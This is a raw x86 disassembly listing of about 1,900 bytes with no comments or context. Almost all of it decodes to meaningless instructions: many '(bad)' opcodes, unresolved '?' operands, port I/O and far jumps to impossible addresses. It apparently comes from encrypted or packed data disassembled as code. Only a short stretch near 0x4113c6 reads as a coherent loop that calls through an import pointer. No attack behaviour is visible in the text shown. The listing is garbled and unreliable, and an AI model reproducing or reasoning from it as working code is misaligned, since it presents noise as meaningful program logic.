  411047:	scas   al,BYTE PTR es:[edi]
  411048:	jb     0x411004
  41104a:	scas   eax,DWORD PTR es:[edi]
  41104b:	cs mov esp,0x1e36a01d
  411051:	scas   eax,DWORD PTR es:[edi]
  411052:	shr    edi,cl
  411054:	dec    ecx
  411055:	mov    ah,0x31
  411057:	add    ebx,DWORD PTR [ecx]
  411059:	fdivr  QWORD PTR [ebx]
  41105b:	daa    
  41105c:	pop    esp
  41105d:	ins    DWORD PTR es:[edi],dx
  41105e:	pusha  
  41105f:	sbb    al,0x21
  411061:	adc    al,0xa2
  411063:	stos   DWORD PTR es:[edi],eax
  411064:	jg     0x4110e1
  411066:	bound  ebp,QWORD PTR [ebx+0x24eb893]
  41106c:	aad    0xaf
  41106e:	fld    st(5)
  411070:	out    dx,eax
  411071:	sub    edx,DWORD PTR [edi]
  411073:	(bad)  
  411074:	and    esp,ebx
  411076:	mov    edi,edi
  411078:	xchg   dh,al
  41107a:	push   ds
  41107b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41107c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107d:	adc    eax,DWORD PTR [ebx+0x737bd24e]
  411083:	lds    eax,FWORD PTR [edi+0x0]
  411086:	xor    eax,0x8ea8c24c
  41108b:	adc    BYTE PTR [ebx+0x51],0xf8
  41108f:	mov    ebp,0x29e3b86f
  411094:	scas   al,BYTE PTR es:[edi]
  411095:	fist   WORD PTR [esi+0xd]
  411098:	imul   ebp,DWORD PTR [edi+0x29],0x4b
  41109c:	std    
  41109d:	or     ebx,DWORD PTR [esi]
  41109f:	mov    ebp,0xc2d297bb
  4110a4:	popa   
  4110a5:	sahf   
  4110a6:	ins    DWORD PTR es:[edi],dx
  4110a7:	mov    ?,edx
  4110a9:	jb     0x4110e3
  4110ab:	ins    DWORD PTR es:[edi],dx
  4110ac:	cdq    
  4110ad:	arpl   WORD PTR [ebx-0x22c9ee9],bx
  4110b3:	leave  
  4110b4:	addr16 pop edx
  4110b6:	aam    0xee
  4110b8:	stos   DWORD PTR es:[edi],eax
  4110b9:	mov    DWORD PTR [edx-0x7730ec70],esi
  4110bf:	push   edx
  4110c0:	in     al,dx
  4110c1:	mov    edi,DWORD PTR [eax+0xae8cd58]
  4110c7:	or     edx,esi
  4110c9:	and    ebx,ebx
  4110cb:	movlps QWORD PTR [ebx-0x5c3cf772],xmm4
  4110d2:	push   edi
  4110d3:	faddp  st(1),st
  4110d5:	inc    edi
  4110d6:	arpl   dx,bx
  4110d8:	rcr    BYTE PTR [eax],1
  4110da:	dec    ebp
  4110db:	test   BYTE PTR [eax+ebp*2+0x309e0a58],ch
  4110e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e3:	push   esi
  4110e4:	popf   
  4110e5:	pop    ss
  4110e6:	cmp    ebx,esi
  4110e8:	lds    eax,FWORD PTR ss:[edi-0x78dd117]
  4110ef:	xchg   BYTE PTR [edi+eax*2+0x46],cl
  4110f3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110f5:	repnz adc bl,BYTE PTR [ecx-0x6ab934c6]
  4110fc:	add    BYTE PTR [edi+0x563ff1de],cl
  411102:	push   ds
  411103:	sbb    al,BYTE PTR [edx-0x4c]
  411106:	repz dec BYTE PTR [esi]
  411109:	cmp    al,0x24
  41110b:	sub    DWORD PTR [esi+0x294ed4cf],ebp
  411111:	scas   al,BYTE PTR es:[edi]
  411112:	cmp    BYTE PTR [ecx+0x4dc2ac5a],dl
  411118:	repnz out dx,al
  41111a:	push   eax
  41111b:	cmp    BYTE PTR [eax],dl
  41111d:	dec    ebx
  41111e:	jg     0x4110a1
  411120:	and    eax,esp
  411122:	repz dec DWORD PTR [edx]
  411125:	pusha  
  411126:	pop    es
  411127:	adc    al,0xbd
  411129:	mov    esp,0x6f1310db
  41112e:	pop    eax
  41112f:	leave  
  411130:	dec    DWORD PTR [edx]
  411132:	aad    0x7c
  411134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411135:	addr16 pop ds
  411137:	inc    esp
  411138:	inc    ebp
  411139:	sub    eax,0x5bfc7888
  41113e:	jp     0x4110fe
  411140:	dec    esp
  411141:	test   BYTE PTR [eax-0x5710dee],bl
  411147:	mov    ebx,0x89645854
  41114c:	push   es
  41114d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41114e:	loop   0x4111a8
  411150:	(bad)  
  411151:	cmp    DWORD PTR [esp+ecx*2],ebp
  411154:	dec    eax
  411155:	loope  0x411101
  411157:	outs   dx,DWORD PTR ds:[esi]
  411158:	cmp    eax,0x5a
  41115b:	mov    edi,0x748b6e75
  411160:	push   ebp
  411161:	enter  0x78ae,0x17
  411165:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  411167:	test   BYTE PTR ds:0x5c13fc5e,0xa4
  41116e:	xor    ecx,edx
  411170:	mov    ecx,0x9f7fdf3e
  411175:	mov    ebp,0xda83d216
  41117a:	imul   edi,DWORD PTR [eax+0x30],0x5a86e259
  411181:	add    bl,ah
  411183:	mov    dl,0xf7
  411185:	xchg   esi,eax
  411186:	imul   edi,DWORD PTR [ecx],0xffffffc1
  411189:	cli    
  41118a:	mov    al,0xd0
  41118c:	mov    eax,ds:0x41823feb
  411191:	pop    ecx
  411192:	mov    ds:0x45e9d7d3,eax
  411197:	xor    ah,dh
  411199:	aad    0x68
  41119b:	mov    ebp,0xe4d5468b
  4111a0:	and    DWORD PTR [esi-0x31],0x348efa49
  4111a7:	sbb    eax,0xd9f71b22
  4111ac:	mov    cl,ch
  4111ae:	adc    DWORD PTR [esi-0x4a0a0dd9],ebx
  4111b4:	ds sahf 
  4111b6:	fistp  DWORD PTR [edi+0x28]
  4111b9:	std    
  4111ba:	in     al,dx
  4111bb:	mov    edx,?
  4111bd:	push   ebx
  4111be:	out    dx,eax
  4111bf:	in     eax,0x9f
  4111c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c2:	je     0x411226
  4111c4:	xchg   edx,eax
  4111c5:	mov    eax,0x57dfef17
  4111ca:	out    dx,al
  4111cb:	pusha  
  4111cc:	ret    0xb865
  4111cf:	in     eax,dx
  4111d0:	cmp    edx,DWORD PTR [esi-0x18]
  4111d3:	repz retw 
  4111d6:	xlat   BYTE PTR ds:[ebx]
  4111d7:	sub    ebp,edx
  4111d9:	mov    ecx,?
  4111db:	sub    eax,0xd9a18420
  4111e0:	dec    edi
  4111e1:	mov    bh,0xc5
  4111e3:	sub    BYTE PTR [esi-0x7de92881],ah
  4111e9:	push   ebp
  4111ea:	xor    dh,BYTE PTR [esi]
  4111ec:	push   esp
  4111ed:	and    eax,0x5a1f457b
  4111f2:	ins    DWORD PTR es:[edi],dx
  4111f3:	(bad)  [ebx+0x67]
  4111f6:	inc    DWORD PTR [edx-0x11]
  4111f9:	add    eax,esp
  4111fb:	and    edi,DWORD PTR [edx-0x46]
  4111fe:	add    edi,edx
  411200:	cs lahf 
  411202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411203:	xor    al,0xcb
  411205:	cld    
  411206:	pop    ecx
  411207:	xor    DWORD PTR [esi],eax
  411209:	fisttp QWORD PTR [esi+0x29]
  41120c:	jns    0x4111fd
  41120e:	inc    ecx
  41120f:	pop    ds
  411210:	jmp    0x29b02f20
  411215:	inc    ebp
  411216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411217:	ret    
  411218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411219:	sar    DWORD PTR [edi],cl
  41121b:	xchg   edx,eax
  41121c:	inc    edi
  41121d:	xchg   BYTE PTR [edi+0x572b68de],al
  411223:	repnz or eax,0xf5b2fe57
  411229:	loopne 0x4111d0
  41122b:	dec    edx
  41122c:	fs jg  0x411236
  41122f:	pop    eax
  411230:	adc    edx,DWORD PTR [eax+0x22]
  411233:	mov    edi,0x49968b4
  411238:	sub    BYTE PTR ss:[ebp-0x77b7eedc],dl
  41123f:	sub    DWORD PTR [ebx-0x4b],eax
  411242:	or     esi,esp
  411244:	mov    ebx,0x5729ad9a
  411249:	sbb    edx,ecx
  41124b:	push   cs
  41124c:	jne    0x4112b2
  41124e:	mov    dh,0x1f
  411250:	sub    eax,0x5bcdf92
  411255:	xchg   esi,eax
  411256:	adc    DWORD PTR [ebp-0x1c],0xe0381b4
  41125d:	popa   
  41125e:	aad    0x79
  411260:	imul   esp,ebp,0xffffffc4
  411263:	shr    BYTE PTR [edx-0x38],1
  411266:	fidiv  DWORD PTR [edi+edi*2]
  411269:	fld    QWORD PTR ds:0x2cf231b7
  41126f:	loop   0x4112e2
  411271:	adc    eax,0xd039ba60
  411276:	xor    ebx,esp
  411278:	(bad)  
  411279:	jbe    0x41120e
  41127b:	nop
  41127c:	push   eax
  41127d:	and    eax,0xa1d23e9a
  411282:	test   DWORD PTR [edx-0x1a],esi
  411285:	jae    0x411272
  411287:	cmp    ah,BYTE PTR [edx-0x60]
  41128a:	add    al,dl
  41128c:	jg     0x4112f5
  41128e:	test   BYTE PTR [eax],0x90
  411291:	popa   
  411292:	pop    ss
  411293:	adc    dh,0x20
  411296:	in     eax,0x6c
  411298:	shl    DWORD PTR [ebp+0x2],cl
  41129b:	mov    dl,BYTE PTR [eax+0x7d]
  41129e:	sbb    al,BYTE PTR [esi+eiz*1+0x35]
  4112a2:	aas    
  4112a3:	je     0x4112bc
  4112a5:	not    BYTE PTR [edi+eiz*2+0x2733ce6]
  4112ac:	jb     0x4112ff
  4112ae:	push   es
  4112af:	arpl   WORD PTR [edi],ax
  4112b1:	or     BYTE PTR [esi-0x462b6b6a],ch
  4112b7:	iret   
  4112b8:	stos   BYTE PTR es:[edi],al
  4112b9:	pushf  
  4112ba:	adc    eax,0xb36cc03
  4112bf:	mov    ah,0x65
  4112c1:	fwait
  4112c2:	hlt    
  4112c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c4:	cmp    al,0xa0
  4112c6:	je     0x411278
  4112c8:	rcl    BYTE PTR [ebp+esi*8+0x7a0f2c85],0xaf
  4112d0:	sub    bl,BYTE PTR [eax-0x48]
  4112d3:	call   0xca513efe
  4112d8:	xor    eax,0xa1b4dc35
  4112dd:	pop    ss
  4112de:	out    0x51,eax
  4112e0:	inc    edi
  4112e1:	cwde   
  4112e2:	jg     0x4112e0
  4112e4:	fistp  WORD PTR [esi+eax*2+0x5a4cbd5]
  4112eb:	pop    ebx
  4112ec:	pop    ss
  4112ed:	frstor ds:0xfcdf455e
  4112f3:	cmp    BYTE PTR [edx],dh
  4112f5:	lods   eax,DWORD PTR ds:[esi]
  4112f6:	xor    bh,ch
  4112f8:	pop    ecx
  4112f9:	cmc    
  4112fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fc:	sub    al,BYTE PTR [eax-0x4e]
  4112ff:	pop    ebp
  411300:	push   es
  411301:	inc    eax
  411302:	out    0xe,al
  411304:	jmp    0xa971:0xeae29d84
  41130b:	arpl   ax,si
  41130d:	dec    esp
  41130e:	repnz mov al,0x7c
  411311:	xchg   esp,eax
  411312:	mov    esp,0x630a7dc5
  411317:	(bad)
  41131a:	jg     0x411351
  41131c:	pop    ebx
  41131d:	leave  
  41131e:	das    
  41131f:	mov    ebp,0x3ed6b932
  411324:	mov    ch,0x51
  411326:	repz xchg edi,eax
  411328:	push   edi
  411329:	mov    dl,0x23
  41132b:	les    esp,FWORD PTR [ebx-0x5debb5bc]
  411331:	fcomi  st,st(2)
  411333:	(bad)  
  411334:	sub    BYTE PTR [ebx],dh
  411336:	rcr    DWORD PTR [ecx+eiz*2],cl
  411339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41133a:	sbb    al,0x4
  41133c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41133d:	rcl    edx,0x36
  411340:	xlat   BYTE PTR ds:[ebx]
  411341:	in     al,dx
  411342:	pop    esi
  411343:	ins    DWORD PTR es:[edi],dx
  411344:	loop   0x4112c9
  411346:	inc    eax
  411347:	add    eax,edi
  411349:	(bad)  
  41134a:	int    0x27
  41134c:	in     eax,dx
  41134d:	dec    edi
  41134e:	test   DWORD PTR [edx],eax
  411350:	dec    esi
  411351:	add    eax,esp
  411353:	(bad)  
  411354:	in     eax,0xbf
  411356:	push   esi
  411357:	jmp    0x411375
  411359:	pop    ebx
  41135a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41135c:	into   
  41135d:	icebp  
  41135e:	pusha  
  41135f:	fs push eax
  411361:	ins    DWORD PTR es:[edi],dx
  411362:	mov    esp,0x86504809
  411367:	push   0x1b13a274
  41136c:	shl    bh,0x4a
  41136f:	sbb    DWORD PTR [edx+0x2fd2997e],ebx
  411375:	xor    DWORD PTR [edi-0x6],ecx
  411378:	push   ss
  411379:	jge    0x411358
  41137b:	or     DWORD PTR [ebp+esi*1+0x20],ebx
  41137f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411380:	inc    eax
  411381:	pop    edi
  411382:	retf   
  411383:	mov    ebx,fs
  411385:	or     BYTE PTR [eax+0x7b],0x4
  411389:	jecxz  0x411315
  41138b:	ds jnp 0x411341
  41138e:	daa    
  41138f:	ins    BYTE PTR es:[edi],dx
  411390:	pop    eax
  411391:	outs   dx,DWORD PTR ds:[esi]
  411392:	mov    ds:0x6f12898a,al
  411397:	outs   dx,DWORD PTR ds:[esi]
  411398:	jnp    0x411375
  41139a:	inc    esi
  41139b:	adc    bh,BYTE PTR [esi-0x17]
  41139e:	adc    al,0x61
  4113a0:	(bad)  
  4113a1:	test   al,0xd3
  4113a3:	js     0x411410
  4113a5:	loope  0x4113db
  4113a7:	lock lea edi,[esi-0x4ca0f1dc]
  4113ae:	jns    0x4113fe
  4113b0:	adc    ebx,DWORD PTR [edx-0x11]
  4113b3:	push   edi
  4113b4:	cmp    al,0xf7
  4113b6:	mov    esp,0xd522922a
  4113bb:	pop    ebx
  4113bc:	adc    DWORD PTR [ecx-0x4be06c37],esp
  4113c2:	fistp  WORD PTR [edi]
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	int3   
  411448:	lea    ecx,[edx+0x704a0efd]
  41144e:	jo     0x4114a8
  411450:	jge    0x4114c2
  411452:	jo     0x4114ae
  411454:	lahf   
  411455:	mov    eax,0xa5932545
  41145a:	dec    edx
  41145b:	xor    eax,0x62a655ae
  411460:	(bad)  
  411462:	mov    edx,0x7cd1692c
  411467:	daa    
  411468:	xchg   BYTE PTR [esi],dh
  41146a:	jge    0x41146a
  41146c:	inc    ebp
  41146d:	adc    BYTE PTR [ecx],0x4c
  411470:	sar    DWORD PTR [ebx+0x27],1
  411473:	pusha  
  411474:	mov    dh,0x33
  411476:	inc    ebx
  411477:	push   0xffffffaa
  411479:	loopne 0x4114ac
  41147b:	push   ds
  41147c:	sbb    BYTE PTR [esi],dh
  41147e:	jnp    0x41146b
  411480:	dec    ebp
  411481:	sahf   
  411482:	and    al,0x7d
  411484:	sbb    eax,0xc649b9bc
  411489:	out    dx,al
  41148a:	ja     0x411470
  41148c:	dec    esp
  41148d:	pushf  
  41148e:	xlat   BYTE PTR ds:[ebx]
  41148f:	out    0x51,eax
  411491:	inc    ebx
  411492:	ret    0x69e3
  411495:	ror    DWORD PTR [esi-0x34c2b000],cl
  41149b:	stc    
  41149c:	sbb    al,0xba
  41149e:	dec    esp
  41149f:	test   BYTE PTR ds:0x2be85223,dh
  4114a5:	popf   
  4114a6:	and    eax,0x9e48be47
  4114ab:	xchg   ebx,eax
  4114ac:	push   ss
  4114ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ae:	and    DWORD PTR [edi*2-0x79f2cebb],0x59
  4114b6:	cmp    eax,edi
  4114b8:	rcr    ebp,1
  4114ba:	and    BYTE PTR gs:[esi],bl
  4114bd:	xchg   DWORD PTR [eax],esp
  4114bf:	xchg   esp,eax
  4114c0:	ins    BYTE PTR es:[edi],dx
  4114c1:	mov    fs,WORD PTR [esi]
  4114c3:	fwait
  4114c4:	inc    ebp
  4114c5:	dec    edi
  4114c6:	or     eax,0xece6b718
  4114cb:	out    dx,eax
  4114cc:	jecxz  0x411481
  4114ce:	cwde   
  4114cf:	sub    DWORD PTR [eax],eax
  4114d1:	in     eax,0x76
  4114d3:	scas   al,BYTE PTR es:[edi]
  4114d4:	adc    esi,esi
  4114d6:	mov    al,ds:0x2051dd50
  4114db:	pusha  
  4114dc:	lahf   
  4114dd:	outs   dx,BYTE PTR ds:[esi]
  4114de:	ja     0x4114a4
  4114e0:	mov    ebp,0xc1c81aeb
  4114e5:	pop    ecx
  4114e6:	into   
  4114e7:	aad    0xb8
  4114e9:	and    eax,esp
  4114eb:	add    BYTE PTR [ecx-0x12],cl
  4114ee:	jl     0x4114ec
  4114f0:	pop    es
  4114f1:	loop   0x411542
  4114f3:	sub    eax,0x43ea6096
  4114f8:	(bad)  
  4114fa:	mov    esp,0x23e65317
  4114ff:	mov    eax,ds:0x5450d069
  411504:	cmp    BYTE PTR [eax+0x414805ce],ah
  41150a:	adc    al,0xe5
  41150c:	inc    esi
  41150d:	inc    ebp
  41150e:	xchg   ecx,eax
  41150f:	jecxz  0x4114c1
  411511:	lds    esi,FWORD PTR [ecx-0x67501feb]
  411517:	mov    cl,0xfb
  411519:	js     0x4114cd
  41151b:	lods   ax,WORD PTR ds:[esi]
  41151d:	sub    esi,edx
  41151f:	movq   mm5,mm7
  411522:	shl    BYTE PTR [eax-0x7d],1
  411525:	xchg   esp,eax
  411526:	jmp    0x4114d5
  411528:	xchg   esi,eax
  411529:	and    al,0xbe
  41152b:	adc    bl,BYTE PTR ds:[eax-0x70]
  41152f:	mov    esp,0x2a01d921
  411534:	push   esp
  411535:	xchg   esp,eax
  411536:	shl    edi,1
  411538:	inc    edx
  411539:	lock shl ch,cl
  41153c:	push   ebx
  41153d:	inc    ebx
  41153e:	inc    ecx
  41153f:	cmp    DWORD PTR [ebx],eax
  411541:	push   edx
  411542:	sbb    eax,0x2bc46e12
  411547:	xor    DWORD PTR [eax+0x6],0xbae0f4a6
  41154e:	sub    al,0x82
  411550:	push   ebp
  411551:	rcr    esp,0x73
  411554:	pop    ss
  411555:	xchg   ebx,eax
  411556:	bnd jg 0x411521
  411559:	push   0x21
  41155b:	fnsave [ecx-0x2baf36fd]
  411561:	ret    
  411562:	repnz and eax,0xca9264fa
  411568:	xchg   edi,eax
  411569:	iret   
  41156a:	add    eax,0xdf5fb2ea
  41156f:	daa    
  411570:	mov    esi,0x31634362
  411575:	cwde   
  411576:	(bad)  
  411577:	pop    ebx
  411578:	and    eax,0xfbb0d35e
  41157d:	xlat   BYTE PTR ds:[ebx]
  41157e:	and    DWORD PTR [edx-0x163b549],ecx
  411584:	pop    ecx
  411585:	dec    esp
  411586:	sar    DWORD PTR [esi+0x37],0xa3
  41158a:	out    dx,eax
  41158b:	iret   
  41158c:	(bad)  
  41158d:	stc    
  41158e:	cmp    dl,BYTE PTR [ecx+0x6dea0af9]
  411594:	(bad)  
  411595:	adc    al,0x53
  411597:	les    edi,FWORD PTR [esi]
  411599:	inc    edi
  41159a:	arpl   si,ax
  41159c:	pop    ds
  41159d:	pop    ebp
  41159e:	add    edx,DWORD PTR [edi]
  4115a0:	mov    BYTE PTR [ecx],ah
  4115a2:	leave  
  4115a3:	mov    ?,WORD PTR [edi+0xb31f5f9]
  4115a9:	mov    bl,BYTE PTR [ebp-0x77]
  4115ac:	stos   DWORD PTR es:[edi],eax
  4115ad:	adc    dh,cl
  4115af:	jo     0x41158a
  4115b1:	mov    eax,ds:0x3d549d0
  4115b6:	iret   
  4115b7:	cmp    BYTE PTR ds:0xdee5626a,cl
  4115bd:	test   eax,0x467112e4
  4115c2:	mov    ecx,0x50289e0
  4115c7:	in     eax,dx
  4115c8:	jmp    0x9a3c:0xd71c9437
  4115cf:	fiadd  DWORD PTR [ecx-0xb2b37d4]
  4115d5:	loopne 0x4115d5
  4115d7:	div    ebp
  4115d9:	leave  
  4115da:	pushf  
  4115db:	cmp    eax,0x6787aa14
  4115e0:	ins    DWORD PTR es:[edi],dx
  4115e1:	mov    bh,0x1f
  4115e3:	cmp    al,0xb7
  4115e5:	scas   eax,DWORD PTR es:[edi]
  4115e6:	cmc    
  4115e7:	mov    ds:0x35034bb2,al
  4115ec:	fcmovnb st,st(2)
  4115ee:	and    al,0x6c
  4115f0:	cld    
  4115f1:	int3   
  4115f2:	inc    esp
  4115f3:	push   cs
  4115f4:	data16 outs dx,BYTE PTR ds:[esi]
  4115f6:	aam    0xa9
  4115f8:	sbb    eax,0xa9b0901c
  4115fd:	adc    edi,esi
  4115ff:	cs xchg ebp,eax
  411601:	stos   BYTE PTR es:[edi],al
  411602:	shr    DWORD PTR [esi-0x7974b517],1
  411608:	das    
  411609:	xchg   BYTE PTR [ebx+0x40],ch
  41160c:	aas    
  41160d:	and    dh,BYTE PTR [ecx+0x10]
  411610:	jmp    0x9d41c0eb
  411615:	fisubr DWORD PTR [edx+0x7602b82]
  41161b:	ret    0x5aad
  41161e:	(bad)  
  41161f:	jecxz  0x4115a5
  411621:	and    BYTE PTR [esi+0x63],0xc8
  411625:	call   0x5945:0xb0410db3
  41162c:	repz inc ecx
  41162e:	inc    ebp
  41162f:	rcr    DWORD PTR [ebx+0x44],0xe3
  411633:	mov    cl,dh
  411635:	add    al,0x58
  411637:	cs int 0x5b
  41163a:	and    BYTE PTR [edi],bh
  41163c:	ins    DWORD PTR es:[edi],dx
  41163d:	xor    al,0x8a
  41163f:	ss add eax,0xa3d80143
  411645:	jmp    0xe8c8:0x62ba7585
  41164c:	(bad)  
  41164d:	int3   
  41164e:	add    DWORD PTR [eax],ecx
  411650:	mov    edx,0xd017b2f0
  411655:	sti    
  411656:	or     esp,DWORD PTR [esi]
  411658:	mov    ah,0x42
  41165a:	lds    ecx,FWORD PTR [edi]
  41165c:	cli    
  41165d:	fbld   TBYTE PTR [edi+0x3]
  411660:	test   BYTE PTR [edi+0x12433102],ch
  411666:	test   al,0x91
  411668:	pop    ebp
  411669:	sar    BYTE PTR [edi-0x63],cl
  41166c:	mov    ebp,0xd34873ad
  411671:	pop    esp
  411672:	xor    dl,dh
  411674:	fstp   TBYTE PTR [edx+0x20]
  411677:	(bad)  [ecx-0x8]
  41167a:	xchg   cl,dh
  41167c:	ins    DWORD PTR es:[edi],dx
  41167d:	or     eax,0xabfb5f10
  411682:	mov    bl,0x89
  411684:	or     al,cl
  411686:	add    ecx,eax
  411688:	push   ebx
  411689:	popf   
  41168a:	das    
  41168b:	jnp    0x411679
  41168d:	push   eax
  41168e:	and    al,0x23
  411690:	sbb    dh,bh
  411692:	(bad)  
  411694:	mov    ebp,0x57d19852
  411699:	call   0xdf762f84
  41169e:	ss fdivrp st(0),st
  4116a1:	push   ecx
  4116a2:	fimul  WORD PTR [edi+0xca4513f]
  4116a8:	std    
  4116a9:	xchg   edx,ecx
  4116ab:	stos   BYTE PTR es:[edi],al
  4116ac:	and    al,dh
  4116ae:	lea    esi,[eax+ebx*8]
  4116b1:	xor    al,BYTE PTR [edx]
  4116b3:	in     al,0xed
  4116b5:	jne    0x411649
  4116b7:	stos   BYTE PTR es:[edi],al
  4116b8:	cmp    DWORD PTR [esp+edi*1],ebp
  4116bb:	stc    
  4116bc:	push   ebx
  4116bd:	sbb    esi,DWORD PTR [edi+0x49]
  4116c0:	dec    edi
  4116c1:	jmp    0x94d6:0xe68dff20
  4116c8:	dec    eax
  4116c9:	(bad)  [ecx-0x6b060953]
  4116cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116d0:	hlt    
  4116d1:	jp     0x41173e
  4116d3:	pop    ss
  4116d4:	mov    edi,0x3531380f
  4116d9:	call   0xe3cb:0x6979bb0a
  4116e0:	mov    ch,0xbc
  4116e2:	repz cwde 
  4116e4:	adc    BYTE PTR [edi],ch
  4116e6:	sbb    DWORD PTR [ebx],0xfffffff4
  4116e9:	sbb    DWORD PTR [ebx+ebp*8+0x25],edx
  4116ed:	xchg   ebp,eax
  4116ee:	xor    al,0x98
  4116f0:	push   0x8880197c
  4116f5:	hlt    
  4116f6:	fsub   st(0),st
  4116f8:	mov    cl,0xb8
  4116fa:	aas    
  4116fb:	repz mov al,0x13
  4116fe:	pop    edi
  4116ff:	cdq    
  411700:	ja     0x411728
  411702:	int    0xa3
  411704:	adc    eax,0xa6e56ce5
  411709:	jo     0x4116ad
  41170b:	sbb    eax,0x42eef850
  411710:	in     eax,0xb4
  411712:	sub    eax,0x30d61103
  411717:	sti    
  411718:	push   esi
  411719:	add    ebx,DWORD PTR [ecx-0x4f]
  41171c:	sub    al,0xd4
  41171e:	and    eax,0xe3159602
  411723:	mov    edi,0xbc69d085
  411728:	push   esp
  411729:	ins    DWORD PTR es:[edi],dx
  41172a:	sub    DWORD PTR [esi-0x6a],ecx
  41172d:	rcr    DWORD PTR [esp+esi*4],1
  411730:	cmp    BYTE PTR [ebx],bl
  411732:	or     cl,BYTE PTR [eax+eax*4-0x22]
  411736:	ins    DWORD PTR es:[edi],dx
  411737:	push   ss
  411738:	pop    ds
  411739:	pusha  
  41173a:	in     al,dx
  41173b:	out    dx,eax
  41173c:	cmp    DWORD PTR [ecx-0x7a],0x75
  411740:	mov    ebx,DWORD PTR [edi-0x2a437e01]
  411746:	sub    BYTE PTR [edx],ah
  411748:	pushf  
  411749:	pushf  
  41174a:	icebp  
  41174b:	add    al,0x3a
  41174d:	cmp    eax,0xfd4b738f
  411752:	pop    esi
  411753:	es ss xchg edi,eax
  411756:	and    BYTE PTR [ebx-0x2d],ah
  411759:	cwde   
  41175a:	xlat   BYTE PTR ds:[ebx]
  41175b:	pop    eax
  41175c:	aas    
  41175d:	push   ss
  41175e:	dec    edi
  41175f:	clc    
  411760:	je     0x4116e2
  411762:	push   esi
  411763:	fisubr DWORD PTR [ebp-0x2f7ff76f]
  411769:	jge    0x4117a4
  41176b:	sets   BYTE PTR [ebp+0x0]
  41176f:	hlt    
  411770:	inc    edx
  411771:	sub    DWORD PTR [eax+0x102261e0],ebp
  411777:	pusha  
  411778:	je     0x411757
  41177a:	xchg   edi,eax
  41177b:	jle    0x411705
  41177d:	sbb    BYTE PTR [ebx-0x1d],bl
  411780:	icebp  
  411781:	and    eax,0x90bbf1bf
  411786:	out    0xbf,eax
  411788:	shl    DWORD PTR [ecx+0x66fe6109],0xc7
  41178f:	in     eax,dx
  411790:	fcos   
  411792:	or     BYTE PTR ds:[ecx],ah
  411795:	dec    esp
  411796:	aam    0x43
  411798:	mov    dl,0xcd
  41179a:	add    DWORD PTR [ebx+0x5af1bda9],ebp
  4117a0:	arpl   di,si
  4117a2:	inc    edx
  4117a3:	jmp    0x411725
  4117a5:	inc    ebx
  4117a6:	mov    ds:0x16143d4f,eax
  4117ab:	(bad)  
  4117ac:	shl    DWORD PTR [edi],cl
  4117ae:	pop    ds
  4117af:	push   cs
  4117b0:	fwait
  4117b1:	mov    ch,0x49
  4117b3:	pop    esp
  4117b4:	xlat   BYTE PTR ds:[ebx]
  4117b5:	adc    al,0x65
  4117b7:	sbb    bl,bl
  4117b9:	stos   DWORD PTR es:[edi],eax
  4117ba:	scas   al,BYTE PTR es:[edi]
  4117bb:	xchg   edx,eax
  4117bc:	pop    edi
  4117bd:	mov    dl,0xf6
  4117bf:	pop    eax
  4117c0:	out    dx,eax
  4117c1:	sahf   
  4117c2:	mov    ecx,edi
  4117c4:	inc    ebx
  4117c5:	dec    edx
  4117c6:	ins    DWORD PTR es:[edi],dx
  4117c7:	dec    ebp
  4117c8:	out    0x56,al
  4117ca:	clc    
  4117cb:	(bad)  
  4117cc:	jmp    0x1094:0x9454d012
  4117d3:	pop    ebp
  4117d4:	inc    ebx
  4117d5:	clc    
  4117d6:	dec    ebx
  4117d7:	jg     0x411808
  4117d9:	jecxz  0x4117b4
  4117db:	rol    BYTE PTR [edx],0xbe
  4117de:	in     eax,dx
  4117df:	jmp    0x96075a00
  4117e4:	das    
  4117e5:	rol    BYTE PTR [ebx+0x28],cl
  4117e8:	mov    dl,0x2f
  4117ea:	inc    ebp
  4117eb:	mov    ch,0x58
  4117ed:	push   0x9c34b08c
  4117f2:	push   es
  4117f3:	cmp    BYTE PTR [edx-0x1f84fc5c],0xe6
  4117fa:	lock fdiv st,st(4)
  4117fd:	mov    ecx,0xa377b6c1
  411802:	aam    0xd0
  411804:	cdq    
  411805:	dec    eax
  411806:	in     al,0x58
  411808:	aas    
  411809:	fwait
  41180a:	dec    esi
  41180b:	in     al,0x5c
  41180d:	inc    ebp
